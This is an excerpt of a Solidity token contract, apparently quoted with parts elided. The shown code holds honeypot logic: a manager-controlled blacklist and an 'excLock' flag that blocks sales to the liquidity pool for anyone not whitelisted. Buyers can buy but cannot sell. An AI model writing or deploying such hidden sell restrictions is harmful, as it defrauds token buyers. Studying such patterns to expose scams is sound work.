...
contract ApeToken is Context, IERC20, Ownable {
    ...
    address public manageAddr = 0xc7eFA775b9ba9aA331aC22356261391b1306948E;// PRO
    bool public excLock = true;
    ...
    function setExcLock(bool _excLock) public onlyManage {
        excLock = _excLock;
    }
    ...
    function setBlackList(address[] memory addrList,bool isIn) public onlyManage {
        require(addrList.length > 0  && addrList.length <= 50);
        for (uint256 i; i < addrList.length; ++i) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(!blackList[sender] && !blackList[recipient],"in the blacklist");

        if(lpAddr == sender || lpAddr == recipient){
            require( lpAddr == sender || (lpAddr == recipient && whiteList[sender]) || !excLock , "cannot sold");
        }
